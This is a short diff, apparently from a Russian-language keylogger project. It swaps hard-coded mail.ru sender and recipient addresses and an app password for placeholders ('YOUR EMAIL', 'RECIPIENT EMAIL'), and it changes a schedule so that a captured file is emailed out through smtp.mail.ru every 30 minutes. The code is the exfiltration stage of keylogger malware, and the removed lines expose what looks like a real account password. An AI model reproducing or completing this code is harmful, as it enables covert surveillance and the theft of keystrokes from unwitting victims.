@@ -14,10 +14,10 @@ from encryption import main_ecrp
 def send_email(file_path):
 
     # отправитель
-    sender = "keyloger_sender@mail.ru"
-    password = "6uyxsp5pdvaRHjPCJa5Y"
+    sender = "ВАША ПОЧТА"
+    password = "КОД ПРИЛОЖЕНИЯ"
     # получатель
-    recipient = "keyloger_recipient@mail.ru"
+    recipient = "ПОЧТА ПОЛУЧАТЕЛЯ"
 
     # SMTP-сервер
     server = smtplib.SMTP('smtp.mail.ru', 587)
@@ -55,7 +55,7 @@ def send_email(file_path):
 
 # Функция выполнения расписания
 def run_schedule(file_path):
-    schedule.every(60).seconds.do(send_email, file_path)
+    schedule.every(30).minutes.do(send_email, file_path)
 
     while True:
         schedule.run_pending()
